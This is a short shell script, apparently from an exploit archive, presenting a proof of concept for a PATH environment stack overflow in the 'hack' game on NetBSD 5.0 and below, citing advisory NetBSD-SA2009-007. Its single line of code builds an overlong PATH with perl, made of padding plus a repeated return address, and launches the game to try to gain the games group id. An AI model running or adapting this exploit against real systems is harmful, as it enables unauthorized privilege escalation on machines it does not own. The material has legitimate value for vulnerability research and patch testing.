#!/bin/sh

# NetBSD 5.0 and below Hack PATH Environment overflow proof of concept
# Successfull Exploitation gives guid 100 (games)
# Vulnerable Function is in hack.unix.c
# It is a basic strcpy stack overflow. Such overflows are hard to exploit in
# NetBSD. If you can exploit it successfully feel free to contact me
# Original Advisorie: NetBSD-SA2009-007

# Title: hack rougelike game PATH stack overflow
# Author: JMIT (office@johannesmaria.at)
# Date: 18. May 2010
# Software Link: Contained in all NetBSD Distributions as default
# Version: NetBSD 5.0 and below
# Tested on: NetBSD 5.0-RELEASE
# CVE: Not available. See NetBSD-SA2009-007
# Code:

export PATH=`/usr/pkg/bin/perl -e 'printf("A"x1000);printf("\x41\xb0\xe5\xbf\xbf"x15);'`:/bin:/usr/bin:/usr/sbin:/sbin:/usr/games && hack 